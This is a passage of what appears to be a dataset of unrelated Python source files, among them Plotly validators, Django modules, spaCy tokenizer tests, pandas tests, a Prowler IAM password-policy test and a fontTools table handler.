    def __init__(self, plotly_name=""font"", parent_name=""funnelarea.title"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD143	JD143-_textfont.py	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""scatterpolargl"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY415	JY415-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""barpolar.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD350	JD350-iam_password_policy_uppercase_test.py	"from unittest import mock

from boto3 import client
from moto import mock_iam


class Test_iam_password_policy_uppercase:
    @mock_iam
    def test_iam_password_policy_no_uppercase_flag(self):
        iam_client = client(""iam"")
        # update password policy
        iam_client.update_account_password_policy(RequireUppercaseCharacters=False)

        from prowler.providers.aws.lib.audit_info.audit_info import current_audit_info
        from prowler.providers.aws.services.iam.iam_service import IAM

        with mock.patch(
            ""prowler.providers.aws.services.iam.iam_password_policy_uppercase.iam_password_policy_uppercase.iam_client"",
            new=IAM(current_audit_info),
        ):
            # Test Check
            from prowler.providers.aws.services.iam.iam_password_policy_uppercase.iam_password_policy_uppercase import (
                iam_password_policy_uppercase,
            )

            check = iam_password_policy_uppercase()
            result = check.execute()
            assert result[0].status == ""FAIL""

    @mock_iam
    def test_iam_password_policy_uppercase_flag(self):
        iam_client = client(""iam"")
        # update password policy
        iam_client.update_account_password_policy(RequireUppercaseCharacters=True)

        from prowler.providers.aws.lib.audit_info.audit_info import current_audit_info
        from prowler.providers.aws.services.iam.iam_service import IAM

        with mock.patch(
            ""prowler.providers.aws.services.iam.iam_password_policy_uppercase.iam_password_policy_uppercase.iam_client"",
            new=IAM(current_audit_info),
        ):
            # Test Check
            from prowler.providers.aws.services.iam.iam_password_policy_uppercase.iam_password_policy_uppercase import (
                iam_password_policy_uppercase,
            )

            check = iam_password_policy_uppercase()
            result = check.execute()
            assert result[0].status == ""PASS"""
JD454	JD454-vision_classification_create_dataset.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


def create_dataset(project_id, display_name):
    """"""Create a dataset.""""""
    # [START automl_vision_classification_create_dataset]
    from google.cloud import automl

    # TODO(developer): Uncomment and set the following variables
    # project_id = ""YOUR_PROJECT_ID""
    # display_name = ""your_datasets_display_name""

    client = automl.AutoMlClient()

    # A resource that represents Google Cloud Platform location.
    project_location = f""projects/{project_id}/locations/us-central1""
    # Specify the classification type
    # Types:
    # MultiLabel: Multiple labels are allowed for one example.
    # MultiClass: At most one label is allowed per example.
    # https://cloud.google.com/automl/docs/reference/rpc/google.cloud.automl.v1#classificationtype
    metadata = automl.ImageClassificationDatasetMetadata(
        classification_type=automl.ClassificationType.MULTILABEL
    )
    dataset = automl.Dataset(
        display_name=display_name,
        image_classification_dataset_metadata=metadata,
    )

    # Create a dataset with the dataset metadata in the region.
    response = client.create_dataset(parent=project_location, dataset=dataset, timeout=300)

    created_dataset = response.result()

    # Display the dataset information
    print(""Dataset name: {}"".format(created_dataset.name))
    print(""Dataset id: {}"".format(created_dataset.name.split(""/"")[-1]))
    # [END automl_vision_classification_create_dataset]"
JD478	JD478-test_tokenizer.py	"# coding: utf8
from __future__ import unicode_literals

import pytest


ABBREVIATION_TESTS = [
    (
        ""Hyvää uutta vuotta t. siht. Niemelä!"",
        [""Hyvää"", ""uutta"", ""vuotta"", ""t."", ""siht."", ""Niemelä"", ""!""],
    ),
    (""Paino on n. 2.2 kg"", [""Paino"", ""on"", ""n."", ""2.2"", ""kg""]),
    (
        ""Vuonna 1 eaa. tapahtui kauheita."",
        [""Vuonna"", ""1"", ""eaa."", ""tapahtui"", ""kauheita"", "".""],
    ),
]

HYPHENATED_TESTS = [
    (
        ""1700-luvulle sijoittuva taide-elokuva Wikimedia-säätiön Varsinais-Suomen"",
        [
            ""1700-luvulle"",
            ""sijoittuva"",
            ""taide-elokuva"",
            ""Wikimedia-säätiön"",
            ""Varsinais-Suomen"",
        ],
    )
]

ABBREVIATION_INFLECTION_TESTS = [
    (
        ""VTT:ssa ennen v:ta 2010 suoritetut mittaukset"",
        [""VTT:ssa"", ""ennen"", ""v:ta"", ""2010"", ""suoritetut"", ""mittaukset""],
    ),
    (""ALV:n osuus on 24 %."", [""ALV:n"", ""osuus"", ""on"", ""24"", ""%"", "".""]),
    (""Hiihtäjä oli kilpailun 14:s."", [""Hiihtäjä"", ""oli"", ""kilpailun"", ""14:s"", "".""]),
    (""EU:n toimesta tehtiin jotain."", [""EU:n"", ""toimesta"", ""tehtiin"", ""jotain"", "".""]),
]


@pytest.mark.parametrize(""text,expected_tokens"", ABBREVIATION_TESTS)
def test_fi_tokenizer_abbreviations(fi_tokenizer, text, expected_tokens):
    tokens = fi_tokenizer(text)
    token_list = [token.text for token in tokens if not token.is_space]
    assert expected_tokens == token_list


@pytest.mark.parametrize(""text,expected_tokens"", HYPHENATED_TESTS)
def test_fi_tokenizer_hyphenated_words(fi_tokenizer, text, expected_tokens):
    tokens = fi_tokenizer(text)
    token_list = [token.text for token in tokens if not token.is_space]
    assert expected_tokens == token_list


@pytest.mark.parametrize(""text,expected_tokens"", ABBREVIATION_INFLECTION_TESTS)
def test_fi_tokenizer_abbreviation_inflections(fi_tokenizer, text, expected_tokens):
    tokens = fi_tokenizer(text)
    token_list = [token.text for token in tokens if not token.is_space]
    assert expected_tokens == token_list"
JD282	JD282-0008_alter_faixa_sentido_alter_ticket_freshdesk_tipo.py	"# Generated by Django 4.1 on 2022-09-01 16:57

from django.db import migrations, models


class Migration(migrations.Migration):

    dependencies = [
        ('dnit_bi', '0007_alter_ticket_freshdesk_prioridade_and_more'),
    ]

    operations = [
        migrations.AlterField(
            model_name='faixa',
            name='sentido',
            field=models.CharField(choices=[('C', 'CRESCENTE'), ('D', 'DECRESCENTE')], max_length=11),
        ),
        migrations.AlterField(
            model_name='ticket_freshdesk',
            name='tipo',
            field=models.CharField(choices=[('Equipamento Offline', 'Equipamento Offline'), ('Aferição', 'Aferição'), ('infraestrutura', 'infraestrutura'), ('Falha de Camera', 'Falha de Camera'), ('PISTA DANIFICADA SEM CONDIÇÕES PRA REFAZER LAÇOS', 'PISTA DANIFICADA SEM CONDIÇÕES PRA REFAZER LAÇOS'), ('Outro', 'Outro'), ('OCR', 'OCR'), ('Enquadramento', 'Enquadramento'), ('Implantação / ajuste de sinalização', 'Implantação / ajuste de sinalização'), ('Ajuste Fino', 'Ajuste Fino'), ('Falha de disco', 'Falha de disco'), ('Conectorização', 'Conectorização'), ('Ajuste de Display', 'Ajuste de Display'), ('Manutenção Preventiva', 'Manutenção Preventiva'), ('Falha de infração', 'Falha de infração'), ('Instalação / Reparo de cabo lógico', 'Instalação / Reparo de cabo lógico'), ('Implantação/Reparo de sinalização vertical', 'Implantação/Reparo de sinalização vertical'), ('Poda / Roçada', 'Poda / Roçada'), ('Instalação / Reparo de energia eletrica', 'Instalação / Reparo de energia eletrica'), ('Manutenção corretiva', 'Manutenção corretiva'), ('Equipamento sem energia', 'Equipamento sem energia'), ('Iluminador', 'Iluminador'), ('Sem passagem / Não infracionando', 'Sem passagem / Não infracionando'), ('Ajuste de Imagem', 'Ajuste de Imagem'), ('Internet', 'Internet'), ('Implantação/Reparo de sinalização horizontal', 'Implantação/Reparo de sinalização horizontal'), ('Configuração de envio SIOR', 'Configuração de envio SIOR'), ('Solicitação de Análise', 'Solicitação de Análise')], max_length=100, null=True),
        ),
    ]"
JD17	JD17-who-has.py	"""""""
Simple example that sends a Who-Has request for an object identifier and prints
out the device instance number, object identifier and object name of the
responses.
""""""

import asyncio

from bacpypes3.debugging import ModuleLogger
from bacpypes3.argparse import SimpleArgumentParser
from bacpypes3.primitivedata import ObjectIdentifier
from bacpypes3.app import Application

# some debugging
_debug = 0
_log = ModuleLogger(globals())


async def main() -> None:
    app = None
    try:
        parser = SimpleArgumentParser()
        parser.add_argument(
            ""low_limit"",
            type=int,
            help=""device instance range low limit"",
        )
        parser.add_argument(
            ""high_limit"",
            type=int,
            help=""device instance range high limit"",
        )
        parser.add_argument(
            ""object_identifier"",
            help=""object identifier"",
        )
        args = parser.parse_args()
        if _debug:
            _log.debug(""args: %r"", args)

        # build an application
        app = Application.from_args(args)
        if _debug:
            _log.debug(""app: %r"", app)

        object_identifier = ObjectIdentifier(args.object_identifier)
        if _debug:
            _log.debug(""object_identifier: %r"", object_identifier)

        # run the query
        i_haves = await app.who_has(
            args.low_limit,
            args.high_limit,
            object_identifier,
        )
        if _debug:
            _log.debug(""    - i_haves: %r"", i_haves)
        for i_have in i_haves:
            if _debug:
                _log.debug(""    - i_have: %r"", i_have)
            print(
                f""{i_have.deviceIdentifier[1]} {i_have.objectIdentifier} {i_have.objectName!r}""
            )

    finally:
        if app:
            app.close()


if __name__ == ""__main__"":
    asyncio.run(main())"
JD170	JD170-install_scripts.py	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from distutils.core import Command
from distutils import log
from stat import ST_MODE


class install_scripts(Command):

    description = ""install scripts (Python or otherwise)""

    user_options = [
        ('install-dir=', 'd', ""directory to install scripts to""),
        ('build-dir=', 'b', ""build directory (where to install from)""),
        ('force', 'f', ""force installation (overwrite existing files)""),
        ('skip-build', None, ""skip the build steps""),
    ]

    boolean_options = ['force', 'skip-build']

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options('build', ('build_scripts', 'build_dir'))
        self.set_undefined_options(
            'install',
            ('install_scripts', 'install_dir'),
            ('force', 'force'),
            ('skip_build', 'skip_build'),
        )

    def run(self):
        if not self.skip_build:
            self.run_command('build_scripts')
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == 'posix':
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
JY142	JY142-_compat.py	"import sys
import platform


__all__ = ['install', 'NullFinder', 'Protocol']


try:
    from typing import Protocol
except ImportError:  # pragma: no cover
    from ..typing_extensions import Protocol  # type: ignore


def install(cls):
    """"""
    Class decorator for installation on sys.meta_path.

    Adds the backport DistributionFinder to sys.meta_path and
    attempts to disable the finder functionality of the stdlib
    DistributionFinder.
    """"""
    sys.meta_path.append(cls())
    disable_stdlib_finder()
    return cls


def disable_stdlib_finder():
    """"""
    Give the backport primacy for discovering path-based distributions
    by monkey-patching the stdlib O_O.

    See #91 for more background for rationale on this sketchy
    behavior.
    """"""

    def matches(finder):
        return getattr(
            finder, '__module__', None
        ) == '_frozen_importlib_external' and hasattr(finder, 'find_distributions')

    for finder in filter(matches, sys.meta_path):  # pragma: nocover
        del finder.find_distributions


class NullFinder:
    """"""
    A ""Finder"" (aka ""MetaClassFinder"") that never finds any modules,
    but may find distributions.
    """"""

    @staticmethod
    def find_spec(*args, **kwargs):
        return None

    # In Python 2, the import system requires finders
    # to have a find_module() method, but this usage
    # is deprecated in Python 3 in favor of find_spec().
    # For the purposes of this finder (i.e. being present
    # on sys.meta_path but having no other import
    # system functionality), the two methods are identical.
    find_module = find_spec


def pypy_partial(val):
    """"""
    Adjust for variable stacklevel on partial under PyPy.

    Workaround for #327.
    """"""
    is_pypy = platform.python_implementation() == 'PyPy'
    return val + is_pypy"
JD98	JD98-__init__.py	"from django.core import signals
from django.db.utils import (
    DEFAULT_DB_ALIAS, DJANGO_VERSION_PICKLE_KEY, ConnectionHandler,
    ConnectionRouter, DatabaseError, DataError, Error, IntegrityError,
    InterfaceError, InternalError, NotSupportedError, OperationalError,
    ProgrammingError,
)

__all__ = [
    'connection', 'connections', 'router', 'DatabaseError', 'IntegrityError',
    'InternalError', 'ProgrammingError', 'DataError', 'NotSupportedError',
    'Error', 'InterfaceError', 'OperationalError', 'DEFAULT_DB_ALIAS',
    'DJANGO_VERSION_PICKLE_KEY',
]

connections = ConnectionHandler()

router = ConnectionRouter()


class DefaultConnectionProxy:
    """"""
    Proxy for accessing the default DatabaseWrapper object's attributes. If you
    need to access the DatabaseWrapper object itself, use
    connections[DEFAULT_DB_ALIAS] instead.
    """"""
    def __getattr__(self, item):
        return getattr(connections[DEFAULT_DB_ALIAS], item)

    def __setattr__(self, name, value):
        return setattr(connections[DEFAULT_DB_ALIAS], name, value)

    def __delattr__(self, name):
        return delattr(connections[DEFAULT_DB_ALIAS], name)

    def __eq__(self, other):
        return connections[DEFAULT_DB_ALIAS] == other


# For backwards compatibility. Prefer connections['default'] instead.
connection = DefaultConnectionProxy()


# Register an event to reset saved queries when a Django request is started.
def reset_queries(**kwargs):
    for conn in connections.all():
        conn.queries_log.clear()


signals.request_started.connect(reset_queries)


# Register an event to reset transaction state and close connections past
# their lifetime.
def close_old_connections(**kwargs):
    for conn in connections.all():
        conn.close_if_unusable_or_obsolete()


signals.request_started.connect(close_old_connections)
signals.request_finished.connect(close_old_connections)"
JD178	JD178-log.py	"from django import template
from django.contrib.admin.models import LogEntry

register = template.Library()


class AdminLogNode(template.Node):
    def __init__(self, limit, varname, user):
        self.limit, self.varname, self.user = limit, varname, user

    def __repr__(self):
        return ""<GetAdminLog Node>""

    def render(self, context):
        if self.user is None:
            entries = LogEntry.objects.all()
        else:
            user_id = self.user
            if not user_id.isdigit():
                user_id = context[self.user].pk
            entries = LogEntry.objects.filter(user__pk=user_id)
        context[self.varname] = entries.select_related(""content_type"", ""user"")[
            : int(self.limit)
        ]
        return """"


@register.tag
def get_admin_log(parser, token):
    """"""
    Populate a template variable with the admin log for the given criteria.

    Usage::

        {% get_admin_log [limit] as [varname] for_user [context_var_with_user_obj] %}

    Examples::

        {% get_admin_log 10 as admin_log for_user 23 %}
        {% get_admin_log 10 as admin_log for_user user %}
        {% get_admin_log 10 as admin_log %}

    Note that ``context_var_containing_user_obj`` can be a hard-coded integer
    (user ID) or the name of a template context variable containing the user
    object whose ID you want.
    """"""
    tokens = token.contents.split()
    if len(tokens) < 4:
        raise template.TemplateSyntaxError(
            ""'get_admin_log' statements require two arguments""
        )
    if not tokens[1].isdigit():
        raise template.TemplateSyntaxError(
            ""First argument to 'get_admin_log' must be an integer""
        )
    if tokens[2] != ""as"":
        raise template.TemplateSyntaxError(
            ""Second argument to 'get_admin_log' must be 'as'""
        )
    if len(tokens) > 4:
        if tokens[4] != ""for_user"":
            raise template.TemplateSyntaxError(
                ""Fourth argument to 'get_admin_log' must be 'for_user'""
            )
    return AdminLogNode(
        limit=tokens[1],
        varname=tokens[3],
        user=(tokens[5] if len(tokens) > 5 else None),
    )"
JY491	JY491-L_T_S_H_.py	"from fontTools.misc.textTools import safeEval
from . import DefaultTable
import struct
import array

# XXX I've lowered the strictness, to make sure Apple's own Chicago
# XXX gets through. They're looking into it, I hope to raise the standards
# XXX back to normal eventually.


class table_L_T_S_H_(DefaultTable.DefaultTable):
    def decompile(self, data, ttFont):
        version, numGlyphs = struct.unpack("">HH"", data[:4])
        data = data[4:]
        assert version == 0, ""unknown version: %s"" % version
        assert (len(data) % numGlyphs) < 4, ""numGlyphs doesn't match data length""
        # ouch: the assertion is not true in Chicago!
        # assert numGlyphs == ttFont['maxp'].numGlyphs
        yPels = array.array(""B"")
        yPels.frombytes(data)
        self.yPels = {}
        for i in range(numGlyphs):
            self.yPels[ttFont.getGlyphName(i)] = yPels[i]

    def compile(self, ttFont):
        version = 0
        names = list(self.yPels.keys())
        numGlyphs = len(names)
        yPels = [0] * numGlyphs
        # ouch: the assertion is not true in Chicago!
        # assert len(self.yPels) == ttFont['maxp'].numGlyphs == numGlyphs
        for name in names:
            yPels[ttFont.getGlyphID(name)] = self.yPels[name]
        yPels = array.array(""B"", yPels)
        return struct.pack("">HH"", version, numGlyphs) + yPels.tobytes()

    def toXML(self, writer, ttFont):
        names = sorted(self.yPels.keys())
        for name in names:
            writer.simpletag(""yPel"", name=name, value=self.yPels[name])
            writer.newline()

    def fromXML(self, name, attrs, content, ttFont):
        if not hasattr(self, ""yPels""):
            self.yPels = {}
        if name != ""yPel"":
            return  # ignore unknown tags
        self.yPels[attrs[""name""]] = safeEval(attrs[""value""])"
JD486	JD486-syntax_iterators.py	"# coding: utf8
from __future__ import unicode_literals

from ...symbols import NOUN, PROPN, PRON
from ...errors import Errors


def noun_chunks(doclike):
    """"""
    Detect base noun phrases. Works on both Doc and Span.
    """"""
    # It follows the logic of the noun chunks finder of English language,
    # adjusted to some Greek language special characteristics.
    # obj tag corrects some DEP tagger mistakes.
    # Further improvement of the models will eliminate the need for this tag.
    labels = [""nsubj"", ""obj"", ""iobj"", ""appos"", ""ROOT"", ""obl""]
    doc = doclike.doc  # Ensure works on both Doc and Span.

    if not doc.is_parsed:
        raise ValueError(Errors.E029)

    np_deps = [doc.vocab.strings.add(label) for label in labels]
    conj = doc.vocab.strings.add(""conj"")
    nmod = doc.vocab.strings.add(""nmod"")
    np_label = doc.vocab.strings.add(""NP"")
    prev_end = -1
    for i, word in enumerate(doclike):
        if word.pos not in (NOUN, PROPN, PRON):
            continue
        # Prevent nested chunks from being produced
        if word.left_edge.i <= prev_end:
            continue
        if word.dep in np_deps:
            flag = False
            if word.pos == NOUN:
                #  check for patterns such as γραμμή παραγωγής
                for potential_nmod in word.rights:
                    if potential_nmod.dep == nmod:
                        prev_end = potential_nmod.i
                        yield word.left_edge.i, potential_nmod.i + 1, np_label
                        flag = True
                        break
            if flag is False:
                prev_end = word.i
                yield word.left_edge.i, word.i + 1, np_label
        elif word.dep == conj:
            # covers the case: έχει όμορφα και έξυπνα παιδιά
            head = word.head
            while head.dep == conj and head.head.i < head.i:
                head = head.head
            # If the head is an NP, and we're coordinated to it, we're an NP
            if head.dep in np_deps:
                prev_end = word.i
                yield word.left_edge.i, word.i + 1, np_label


SYNTAX_ITERATORS = {""noun_chunks"": noun_chunks}"
JD232	JD232-test_delitem.py	"import pytest

from pandas import (
    Index,
    Series,
    date_range,
)
import pandas._testing as tm


class TestSeriesDelItem:
    def test_delitem(self):
        # GH#5542
        # should delete the item inplace
        s = Series(range(5))
        del s[0]

        expected = Series(range(1, 5), index=range(1, 5))
        tm.assert_series_equal(s, expected)

        del s[1]
        expected = Series(range(2, 5), index=range(2, 5))
        tm.assert_series_equal(s, expected)

        # only 1 left, del, add, del
        s = Series(1)
        del s[0]
        tm.assert_series_equal(s, Series(dtype=""int64"", index=Index([], dtype=""int64"")))
        s[0] = 1
        tm.assert_series_equal(s, Series(1))
        del s[0]
        tm.assert_series_equal(s, Series(dtype=""int64"", index=Index([], dtype=""int64"")))

    def test_delitem_object_index(self):
        # Index(dtype=object)
        s = Series(1, index=[""a""])
        del s[""a""]
        tm.assert_series_equal(
            s, Series(dtype=""int64"", index=Index([], dtype=""object""))
        )
        s[""a""] = 1
        tm.assert_series_equal(s, Series(1, index=[""a""]))
        del s[""a""]
        tm.assert_series_equal(
            s, Series(dtype=""int64"", index=Index([], dtype=""object""))
        )

    def test_delitem_missing_key(self):
        # empty
        s = Series(dtype=object)

        with pytest.raises(KeyError, match=r""^0$""):
            del s[0]

    def test_delitem_extension_dtype(self):
        # GH#40386
        # DatetimeTZDtype
        dti = date_range(""2016-01-01"", periods=3, tz=""US/Pacific"")
        ser = Series(dti)

        expected = ser[[0, 2]]
        del ser[1]
        assert ser.dtype == dti.dtype
        tm.assert_series_equal(ser, expected)

        # PeriodDtype
        pi = dti.tz_localize(None).to_period(""D"")
        ser = Series(pi)

        expected = ser[:2]
        del ser[2]
        assert ser.dtype == pi.dtype
        tm.assert_series_equal(ser, expected)"
JD91	JD91-middleware.py	"from django.apps import apps
from django.conf import settings
from django.contrib.redirects.models import Redirect
from django.contrib.sites.shortcuts import get_current_site
from django.core.exceptions import ImproperlyConfigured
from django.http import HttpResponseGone, HttpResponsePermanentRedirect
from django.utils.deprecation import MiddlewareMixin


class RedirectFallbackMiddleware(MiddlewareMixin):
    # Defined as class-level attributes to be subclassing-friendly.
    response_gone_class = HttpResponseGone
    response_redirect_class = HttpResponsePermanentRedirect

    def __init__(self, get_response=None):
        if not apps.is_installed('django.contrib.sites'):
            raise ImproperlyConfigured(
                ""You cannot use RedirectFallbackMiddleware when ""
                ""django.contrib.sites is not installed.""
            )
        super().__init__(get_response)

    def process_response(self, request, response):
        # No need to check for a redirect for non-404 responses.
        if response.status_code != 404:
            return response

        full_path = request.get_full_path()
        current_site = get_current_site(request)

        r = None
        try:
            r = Redirect.objects.get(site=current_site, old_path=full_path)
        except Redirect.DoesNotExist:
            pass
        if r is None and settings.APPEND_SLASH and not request.path.endswith('/'):
            try:
                r = Redirect.objects.get(
                    site=current_site,
                    old_path=request.get_full_path(force_append_slash=True),
                )
            except Redirect.DoesNotExist:
                pass
        if r is not None:
            if r.new_path == '':
                return self.response_gone_class()
            return self.response_redirect_class(r.new_path)

        # No redirect was found. Return the response.
        return response"
JY528	JY528-_insidetextfont.py	"import _plotly_utils.basevalidators


class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""insidetextfont"", parent_name=""funnelarea"", **kwargs
    ):
        super(InsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD173	JD173-Balloons_pb2.py	"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: streamlit/proto/Balloons.proto

from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='streamlit/proto/Balloons.proto',
  package='',
  syntax='proto3',
  serialized_options=None,
  create_key=_descriptor._internal_create_key,
  serialized_pb=b'\n\x1estreamlit/proto/Balloons.proto\""$\n\x08\x42\x61lloons\x12\x0c\n\x04show\x18\x03 \x01(\x08J\x04\x08\x01\x10\x02J\x04\x08\x02\x10\x03\x62\x06proto3'
)




_BALLOONS = _descriptor.Descriptor(
  name='Balloons',
  full_name='Balloons',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  create_key=_descriptor._internal_create_key,
  fields=[
    _descriptor.FieldDescriptor(
      name='show', full_name='Balloons.show', index=0,
      number=3, type=8, cpp_type=7, label=1,
      has_default_value=False, default_value=False,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  serialized_options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=34,
  serialized_end=70,
)

DESCRIPTOR.message_types_by_name['Balloons'] = _BALLOONS
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

Balloons = _reflection.GeneratedProtocolMessageType('Balloons', (_message.Message,), {
  'DESCRIPTOR' : _BALLOONS,
  '__module__' : 'streamlit.proto.Balloons_pb2'
  # @@protoc_insertion_point(class_scope:Balloons)
  })
_sym_db.RegisterMessage(Balloons)


# @@protoc_insertion_point(module_scope)"
JY236	JY236-test_parent_node_provider.py	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.


from textwrap import dedent

import viktor._vendor.libcst as cst
from viktor._vendor.libcst.metadata import MetadataWrapper, ParentNodeProvider
from viktor._vendor.libcst.testing.utils import data_provider, UnitTest


class DependentVisitor(cst.CSTVisitor):
    METADATA_DEPENDENCIES = (ParentNodeProvider,)

    def __init__(self, *, test: UnitTest) -> None:
        self.test = test

    def on_visit(self, node: cst.CSTNode) -> bool:
        for child in node.children:
            parent = self.get_metadata(ParentNodeProvider, child)
            self.test.assertEqual(parent, node)
        return True


class ParentNodeProviderTest(UnitTest):
    @data_provider(
        (
            (
                """"""
                foo = 'toplevel'
                fn1(foo)
                fn2(foo)
                def fn_def():
                    foo = 'shadow'
                    fn3(foo)
                """""",
            ),
            (
                """"""
                global_var = None
                @cls_attr
                class Cls(cls_attr, kwarg=cls_attr):
                    cls_attr = 5
                    def f():
                        pass
                """""",
            ),
            (
                """"""
                iterator = None
                condition = None
                [elt for target in iterator if condition]
                {elt for target in iterator if condition}
                {elt: target for target in iterator if condition}
                (elt for target in iterator if condition)
                """""",
            ),
        )
    )
    def test_parent_node_provier(self, code: str) -> None:
        wrapper = MetadataWrapper(cst.parse_module(dedent(code)))
        wrapper.visit(DependentVisitor(test=self))"
JY352	JY352-util.py	"# Copyright (c) 2020 All Rights Reserved
# Author: William H. Guss, Brandon Houghton

import collections
from minerl.herobraine.hero.handler import Handler
import numpy as np
from functools import reduce

from typing import List, Tuple

from minerl.herobraine.hero.spaces import Box, Dict, Enum, MineRLSpace


# TODO: Make a test.
# TODO: Refactor this. This iss unioning handlers, not sapces.
def union_spaces(hdls_1: List[Handler], hdls_2: List[Handler]) -> List[MineRLSpace]:
